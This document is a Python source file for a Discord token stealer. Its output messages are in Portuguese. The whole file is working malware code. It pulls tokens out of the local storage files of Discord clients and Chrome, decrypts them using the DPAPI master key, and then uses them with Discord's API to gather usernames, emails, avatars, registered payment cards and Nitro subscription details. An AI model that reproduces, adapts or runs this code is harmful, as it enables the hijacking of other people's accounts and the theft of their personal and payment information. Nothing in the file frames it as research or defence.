import base64
import json
import os
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import requests
from datetime import datetime

class TokenExtractor:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
        self.validated_tokens = []  

    def extract_tokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
                                                     self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
                            if token not in self.validated_tokens and self.validate_token(token):
                                self.tokens.append(token)
                                self.validated_tokens.append(token) 
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp_enc, line):
                            if token not in self.validated_tokens and self.validate_token(token):
                                self.tokens.append(token)
                                self.validated_tokens.append(token)  

    def validate_token(self, token):
        user_data = self.get_user_data(token)
        if user_data and token not in self.validated_tokens:  
            print(f"Token: {token}")
            print(f"Nome de usuário: {user_data['username']}")
            print(f"E-mail: {user_data.get('email', 'Não disponível')}")

            avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
            print(f"Foto de perfil: {avatar_url}")
            
            self.download_profile_picture(user_data['id'], user_data['avatar'])

            payment_sources = self.get_payment_sources(token)
            if payment_sources:
                print(f"Cartões de crédito registrados: {len(payment_sources)}")
            else:
                print("Nenhum cartão de crédito registrado")

            if user_data['premium_type']:
                subscriptions = self.get_nitro_subscription(token)
                if subscriptions:
                    for sub in subscriptions:
                        renew_timestamp = sub.get("current_period_end")
                        if renew_timestamp:
                            expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
                            print(f"Nitro ativo, expira em: {expiration_date}")
                        else:
                            print("Nitro ativo, mas sem data de expiração disponível")
                else:
                    print("Nitro ativo, mas sem informações sobre a assinatura")
            else:
                print("Nitro: Não")
            print("-" * 30)
            return True
        return False

    def get_user_data(self, token):
        response = requests.get(self.base_url, headers={'Authorization': token})
        if response.status_code == 200:
            return response.json()
        return None

    def get_payment_sources(self, token):
        payment_url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
        response = requests.get(payment_url, headers={'Authorization': token})
        if response.status_code == 200:
            return response.json()
        return None

    def get_nitro_subscription(self, token):
        subscription_url = "https://discord.com/api/v9/users/@me/billing/subscriptions"
        response = requests.get(subscription_url, headers={'Authorization': token})
        if response.status_code == 200:
            return response.json()
        return None

    def decrypt_val(self, buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode()

    def get_master_key(self, path):
        if not os.path.exists(path):
            return None
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def download_profile_picture(self, user_id, avatar_id):
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png"
        response = requests.get(avatar_url, stream=True)
        if response.status_code == 200:
            with open(f"{user_id}_avatar.png", "wb") as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)
            print(f"Foto de perfil salva como {user_id}_avatar.png")
        else:
            print(f"Falha ao baixar a foto de perfil para o usuário {user_id}")

    def get_tokens(self):
        self.extract_tokens()
        return list(set(self.tokens))  

if __name__ == "__main__":
    extractor = TokenExtractor()
    tokens = extractor.get_tokens()
    for token in tokens:
        print(token)
